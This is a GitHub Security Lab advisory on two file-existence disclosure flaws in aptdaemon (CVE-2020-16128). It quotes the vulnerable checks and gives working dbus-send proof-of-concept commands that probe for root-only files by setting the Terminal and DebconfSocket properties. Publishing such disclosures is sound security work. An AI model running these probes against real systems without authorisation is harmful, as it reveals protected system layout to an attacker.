<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">December 11, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-192, GHSL-2020-196: File existence disclosure in aptdeamon - CVE-2020-16128</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/kevinbackhouse">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/4358136?s=35" height="35" width="35">
        <span>Kevin Backhouse</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>Two vulnerabilities in aptdaemon allow an unprivileged user to probe the existence of arbitrary files on the system. These vulnerabilities are very similar to <a href="https://bugs.launchpad.net/ubuntu/+source/aptdaemon/+bug/1888235">CVE-2020-15703</a>.</p>

<h2 id="product">Product</h2>

<p>aptdaemon</p>

<h2 id="tested-version">Tested Version</h2>

<ul>
  <li>aptdaemon, version 1.1.1+bzr982-0ubuntu32.2</li>
  <li>Tested on Ubuntu 20.04.1 LTS</li>
</ul>

<h2 id="details">Details</h2>

<h3 id="issue-1-file-existence-disclosure-by-setting-the-terminal-property-ghsl-2020-192">Issue 1: file existence disclosure by setting the “Terminal” property (<code class="language-plaintext highlighter-rouge">GHSL-2020-192</code>)</h3>

<p>The <code class="language-plaintext highlighter-rouge">_set_terminal</code> method at <a href="https://git.launchpad.net/ubuntu/+source/aptdaemon/tree/aptdaemon/core.py?h=ubuntu/focal-updates&amp;id=7d405e386d19ed21c447bd200d421b5ba11527f3#n1090">aptdaemon/core.py, line 1090</a> does several checks to make sure that the path corresponds to a valid tty:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">access</span><span class="p">(</span><span class="n">ttyname</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">W_OK</span><span class="p">):</span>
    <span class="k">raise</span> <span class="n">errors</span><span class="p">.</span><span class="n">AptDaemonError</span><span class="p">(</span><span class="s">"Pty device does not exist: "</span>
                                <span class="s">"%s"</span> <span class="o">%</span> <span class="n">ttyname</span><span class="p">)</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">stat</span><span class="p">(</span><span class="n">ttyname</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="bp">self</span><span class="p">.</span><span class="n">uid</span><span class="p">:</span>
    <span class="k">raise</span> <span class="n">errors</span><span class="p">.</span><span class="n">AptDaemonError</span><span class="p">(</span><span class="s">"Pty device '%s' has to be owned by"</span>
                                <span class="s">"the owner of the transaction "</span>
                                <span class="s">"(uid %s) "</span> <span class="o">%</span> <span class="p">(</span><span class="n">ttyname</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">uid</span><span class="p">))</span>
<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">ttyname</span><span class="p">)</span> <span class="o">!=</span> <span class="s">"/dev/pts"</span><span class="p">:</span>
    <span class="k">raise</span> <span class="n">errors</span><span class="p">.</span><span class="n">AptDaemonError</span><span class="p">(</span><span class="s">"%s isn't a tty"</span> <span class="o">%</span> <span class="n">ttyname</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">slave_fd</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">ttyname</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">os</span><span class="p">.</span><span class="n">O_NOCTTY</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">isatty</span><span class="p">(</span><span class="n">slave_fd</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="n">String</span><span class="p">(</span><span class="n">ttyname</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">PropertyChanged</span><span class="p">(</span><span class="s">"Terminal"</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">terminal</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">errors</span><span class="p">.</span><span class="n">AptDaemonError</span><span class="p">(</span><span class="s">"%s isn't a tty"</span> <span class="o">%</span> <span class="n">ttyname</span><span class="p">)</span>
<span class="k">finally</span><span class="p">:</span>
    <span class="n">os</span><span class="p">.</span><span class="n">close</span><span class="p">(</span><span class="n">slave_fd</span><span class="p">)</span>
</code></pre></div></div>

<p>The difference in the error messages can be used to deduce whether the file exists. An unprivileged user can use this to test the existence of files in a directories which are only readable by root.</p>

<p>Here is a proof-of-concept:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dbus-send <span class="nt">--system</span> <span class="nt">--type</span><span class="o">=</span><span class="s2">"method_call"</span> <span class="nt">--print-reply</span> <span class="nt">--dest</span><span class="o">=</span>org.debian.apt /org/debian/apt org.debian.apt.Clean
method <span class="k">return </span><span class="nb">time</span><span class="o">=</span>1602518207.542350 <span class="nv">sender</span><span class="o">=</span>:1.363 -&gt; <span class="nv">destination</span><span class="o">=</span>:1.362 <span class="nv">serial</span><span class="o">=</span>7 <span class="nv">reply_serial</span><span class="o">=</span>2
   string <span class="s2">"/org/debian/apt/transaction/0ff698f3167945d5a7148fb933c1782e"</span>
<span class="nv">$ </span>dbus-send <span class="nt">--system</span> <span class="nt">--type</span><span class="o">=</span><span class="s2">"method_call"</span> <span class="nt">--print-reply</span> <span class="nt">--dest</span><span class="o">=</span>org.debian.apt /org/debian/apt/transaction/0ff698f3167945d5a7148fb933c1782e org.freedesktop.DBus.Properties.Set string:org.debian.apt.transaction string:Terminal variant:string:/etc/polkit-1/localauthority/10-vendor.d
Error org.debian.apt: Pty device <span class="s1">'/etc/polkit-1/localauthority/10-vendor.d'</span> has to be owned bythe owner of the transaction <span class="o">(</span>uid 1000<span class="o">)</span> 
<span class="nv">$ </span>dbus-send <span class="nt">--system</span> <span class="nt">--type</span><span class="o">=</span><span class="s2">"method_call"</span> <span class="nt">--print-reply</span> <span class="nt">--dest</span><span class="o">=</span>org.debian.apt /org/debian/apt/transaction/0ff698f3167945d5a7148fb933c1782e org.freedesktop.DBus.Properties.Set string:org.debian.apt.transaction string:Terminal variant:string:/etc/polkit-1/localauthority/10-vendor.dx
Error org.debian.apt: Pty device does not exist: /etc/polkit-1/localauthority/10-vendor.dx
</code></pre></div></div>

<p>Note that you need to use the “transaction id” returned by the first <code class="language-plaintext highlighter-rouge">dbus-send</code> in the second and third <code class="language-plaintext highlighter-rouge">dbus-send</code> commands.</p>

<h4 id="impact">Impact</h4>

<p>This issue enables an unprivileged user to probe the existence (or non-existence) of files in directories that are only readable by root.</p>

<h3 id="issue-2-file-existence-disclosure-by-setting-the-debconfsocket-property-ghsl-2020-196">Issue 2: file existence disclosure by setting the “DebconfSocket” property (<code class="language-plaintext highlighter-rouge">GHSL-2020-196</code>)</h3>

<p>The <code class="language-plaintext highlighter-rouge">_set_debconf</code> method at <a href="https://git.launchpad.net/ubuntu/+source/aptdaemon/tree/aptdaemon/core.py?h=ubuntu/focal-updates&amp;id=7d405e386d19ed21c447bd200d421b5ba11527f3#n1122">aptdaemon/core.py, line 1122</a> does a couple of checks to make sure that the path corresponds to a valid file:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">access</span><span class="p">(</span><span class="n">debconf_socket</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">W_OK</span><span class="p">):</span>
    <span class="k">raise</span> <span class="n">errors</span><span class="p">.</span><span class="n">AptDaemonError</span><span class="p">(</span><span class="s">"socket does not exist: "</span>
                                <span class="s">"%s"</span> <span class="o">%</span> <span class="n">debconf_socket</span><span class="p">)</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">stat</span><span class="p">(</span><span class="n">debconf_socket</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="bp">self</span><span class="p">.</span><span class="n">uid</span><span class="p">:</span>
    <span class="k">raise</span> <span class="n">errors</span><span class="p">.</span><span class="n">AptDaemonError</span><span class="p">(</span><span class="s">"socket '%s' has to be owned by the "</span>
                                <span class="s">"owner of the "</span>
                                <span class="s">"transaction"</span> <span class="o">%</span> <span class="n">debconf_socket</span><span class="p">)</span>
</code></pre></div></div>

<p>The difference in the error messages can be used to deduce whether the file exists. An unprivileged user can use this to test the existence of files in a directories which are only readable by root.</p>

<p>Here is a proof-of-concept:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dbus-send <span class="nt">--system</span> <span class="nt">--type</span><span class="o">=</span><span class="s2">"method_call"</span> <span class="nt">--print-reply</span> <span class="nt">--dest</span><span class="o">=</span>org.debian.apt /org/debian/apt org.debian.apt.Clean
method <span class="k">return </span><span class="nb">time</span><span class="o">=</span>1602519192.917160 <span class="nv">sender</span><span class="o">=</span>:1.368 -&gt; <span class="nv">destination</span><span class="o">=</span>:1.370 <span class="nv">serial</span><span class="o">=</span>9 <span class="nv">reply_serial</span><span class="o">=</span>2
   string <span class="s2">"/org/debian/apt/transaction/557e43469a2f43a9ab1874affea55e2d"</span>
<span class="nv">$ </span>dbus-send <span class="nt">--system</span> <span class="nt">--type</span><span class="o">=</span><span class="s2">"method_call"</span> <span class="nt">--print-reply</span> <span class="nt">--dest</span><span class="o">=</span>org.debian.apt /org/debian/apt/transaction/557e43469a2f43a9ab1874affea55e2d org.freedesktop.DBus.Properties.Set string:org.debian.apt.transaction string:DebconfSocket variant:string:/etc/polkit-1/localauthority/10-vendor.d
Error org.debian.apt: socket <span class="s1">'/etc/polkit-1/localauthority/10-vendor.d'</span> has to be owned by the owner of the transaction
<span class="nv">$ </span>dbus-send <span class="nt">--system</span> <span class="nt">--type</span><span class="o">=</span><span class="s2">"method_call"</span> <span class="nt">--print-reply</span> <span class="nt">--dest</span><span class="o">=</span>org.debian.apt /org/debian/apt/transaction/557e43469a2f43a9ab1874affea55e2d org.freedesktop.DBus.Properties.Set string:org.debian.apt.transaction string:DebconfSocket variant:string:/etc/polkit-1/localauthority/10-vendor.dx
Error org.debian.apt: socket does not exist: /etc/polkit-1/localauthority/10-vendor.dx
</code></pre></div></div>

<p>Note that you need to use the “transaction id” returned by the first <code class="language-plaintext highlighter-rouge">dbus-send</code> in the second and third <code class="language-plaintext highlighter-rouge">dbus-send</code> commands.</p>

<h4 id="impact-1">Impact</h4>

<p>This issue enables an unprivileged user to probe the existence (or non-existence) of files in directories that are only readable by root.</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2020-16128</li>
</ul>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2020-10-12: Reported: https://bugs.launchpad.net/ubuntu/+source/aptdaemon/+bug/1899513</li>
  <li>2020-10-19: Acknowledged</li>
  <li>2020-10-20: CVE-2020-16128 assigned by Seth Arnold</li>
  <li>2020-10-20 to 2020-10-21: Discussion with Julian Andres Klode about ideas for how to fix it.</li>
  <li>2020-12-08: fix released.</li>
</ul>

<h2 id="resources">Resources</h2>
<p>https://ubuntu.com/security/notices/USN-4664-1</p>

<h2 id="credit">Credit</h2>

<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/kevinbackhouse">@kevinbackhouse (Kevin Backhouse)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-192</code> or <code class="language-plaintext highlighter-rouge">GHSL-2020-196</code> in any communication regarding this 